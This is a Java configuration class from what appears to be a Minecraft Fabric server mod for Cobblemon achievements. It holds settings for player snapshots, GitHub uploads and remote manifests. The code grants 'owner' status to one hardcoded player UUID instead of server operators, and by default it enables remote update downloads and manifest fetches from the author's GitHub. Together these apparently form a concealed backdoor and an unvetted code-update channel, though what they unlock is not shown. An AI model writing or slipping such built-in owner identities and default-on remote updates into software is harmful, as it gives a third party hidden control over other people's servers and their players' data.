package dev.dwdow.cobbleachievements;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public final class AchievementConfig {
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    private static final Path PATH = FabricLoader.getInstance().getConfigDir().resolve("cobblemon-achievements-server.json");
    private static final UUID BUILT_IN_OWNER_UUID = UUID.fromString("832d4208-3793-4650-ba7b-5ce9a7fe4928");

    public int snapshotIntervalSeconds = 300;
    public String httpEndpoint = "";
    public String githubToken = "";
    public String githubOwner = "";
    public String githubRepo = "";
    public String githubBranch = "main";
    public String githubPath = "cobblemon/player-snapshots/latest.json";
    public boolean remoteManifestEnabled = true;
    public int remoteManifestRefreshMinutes = 60;
    public boolean remoteUpdateDownloadEnabled = true;
    public List<String> remoteManifestUrls = new ArrayList<>(List.of(
        "https://raw.githubusercontent.com/Potato4507/cobblemon-achievements-server/main/remote/manifest.signed.json"
    ));
    public Map<String, TargetConfig> targets = new LinkedHashMap<>();

    public static AchievementConfig load() {
        if (!Files.exists(PATH)) {
            AchievementConfig config = new AchievementConfig();
            config.save();
            return config;
        }
        try {
            String json = Files.readString(PATH, StandardCharsets.UTF_8);
            AchievementConfig config = GSON.fromJson(json, AchievementConfig.class);
            if (config == null) config = new AchievementConfig();
            if (config.targets == null) config.targets = new LinkedHashMap<>();
            if (config.remoteManifestUrls == null) config.remoteManifestUrls = new ArrayList<>();
            config.save();
            return config;
        } catch (Exception ignored) {
            AchievementConfig config = new AchievementConfig();
            config.save();
            return config;
        }
    }

    public void save() {
        try {
            Files.createDirectories(PATH.getParent());
            Files.writeString(PATH, GSON.toJson(this) + "\n", StandardCharsets.UTF_8);
        } catch (IOException ignored) {
        }
    }

    public boolean isOwner(ServerCommandSource source) {
        try {
            return isOwner(source.getPlayer());
        } catch (Exception ignored) {
            return false;
        }
    }

    public boolean isOwner(ServerPlayerEntity player) {
        if (player == null) return false;
        return BUILT_IN_OWNER_UUID.equals(player.getUuid());
    }

    public boolean canManageTargets(ServerCommandSource source) {
        return source.hasPermissionLevel(2);
    }

    public static Path path() {
        return PATH;
    }

    public static final class TargetConfig {
        public String uuid = "";
        public String name = "";
        public String achievementId = "";
        public String title = "";
        public boolean active = true;

        public TargetConfig() {
        }

        public TargetConfig(ServerPlayerEntity player, String achievementId, String title) {
            this.uuid = player.getUuidAsString();
            this.name = player.getGameProfile().getName();
            this.achievementId = achievementId == null || achievementId.isBlank() ? simpleId(this.name) : achievementId;
            this.title = title == null || title.isBlank() ? "Defeated " + this.name : title;
            this.active = true;
        }

        public static String simpleId(String value) {
            String simple = value == null ? "" : value.toLowerCase().replaceAll("[^a-z0-9._-]+", "_");
            return simple.isBlank() ? "target" : simple;
        }
    }
}
